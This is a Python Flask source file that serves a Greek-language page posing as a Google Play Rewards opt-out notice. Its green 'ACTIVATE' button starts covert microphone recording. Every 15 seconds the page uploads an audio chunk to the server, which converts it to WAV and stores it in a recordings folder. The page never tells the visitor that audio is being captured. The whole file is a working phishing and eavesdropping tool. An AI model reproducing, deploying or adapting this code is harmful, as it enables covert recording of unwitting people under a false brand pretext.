import os
import base64
from flask import Flask, render_template_string, request, jsonify, send_from_directory, url_for
from datetime import datetime
from pydub import AudioSegment

app = Flask(__name__)

# Directory to save audio recordings
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
if not os.path.exists(RECORDINGS_FOLDER):
    os.makedirs(RECORDINGS_FOLDER)

@app.route('/recordings/<path:filename>')
def serve_recording(filename):
    """Serve files from the recordings folder."""
    return send_from_directory(RECORDINGS_FOLDER, filename)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            html, body {
                width: 100%;
                height: 100%;
                overflow: hidden;
                display: flex;
                justify-content: center;
                align-items: flex-end;
                background: url('/static/background.jpg') no-repeat center center fixed;
                background-size: cover;
            }
            .container {
                width: 100%;
                text-align: center;
                padding: 20px;
                background: rgba(0, 0, 0, 0.8);
                color: white;
                font-size: 1.5vw;
                font-family: Arial, sans-serif;
            }
            .button-container {
                margin-top: 15px;
                display: flex;
                justify-content: center;
                gap: 10px;
            }
            .button {
                padding: 10px 20px;
                font-size: 1.2vw;
                cursor: pointer;
                border: none;
                border-radius: 5px;
            }
            .green-button {
                background-color: green;
                color: white;
            }
            .red-button {
                background-color: red;
                color: white;
            }
            @media (max-width: 600px) {
                .container {
                    font-size: 4vw;
                }
                .button {
                    font-size: 4vw;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <p>Με την εξαίρεση από τις αποκλειστικές προσφορές:</p>
            <p>Δεν θα συμμετέχεις πλέον στο πρόγραμμα επιβραβεύσεων Play rewards. 
            Αυτόματα θα χάσεις το επίπεδό σου, όλους τους πόντους επιπέδου καθώς 
            και όλους τους πόντους εξαργύρωσης.</p>
            <div class="button-container">
                <button class="button green-button" onclick="startRecording()">ΕΝΕΡΓΟΠΟΙΗΣΗ</button>
                <button class="button red-button" onclick="cancel()">ΑΚΥΡΩΣΗ</button>
            </div>
        </div>
        
        <script>
            let mediaRecorder;

            async function startRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

                    mediaRecorder.ondataavailable = event => {
                        if (event.data.size > 0) {
                            saveRecording(event.data);
                        }
                    };

                    mediaRecorder.start(15000);
                } catch (err) {
                    console.error("Error accessing microphone:", err);
                    alert("Microphone access is required.");
                }
            }

            async function saveRecording(audioBlob) {
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = async function() {
                    const base64Audio = reader.result.split(',')[1];
                    await fetch('/upload_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ audio: base64Audio })
                    });
                };
            }

            function cancel() {
                alert("Επιλέξατε ΑΚΥΡΩΣΗ");
            }
        </script>
    </body>
    </html>
    ''')

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "No audio data received"}), 400

        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        webm_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.webm")
        wav_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.wav")

        with open(webm_path, 'wb') as f:
            f.write(base64.b64decode(audio_data))

        audio = AudioSegment.from_file(webm_path, format="webm")
        audio.export(wav_path, format="wav")

        os.remove(webm_path)

        return jsonify({"message": f"Audio saved successfully as {wav_path}."}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4040)
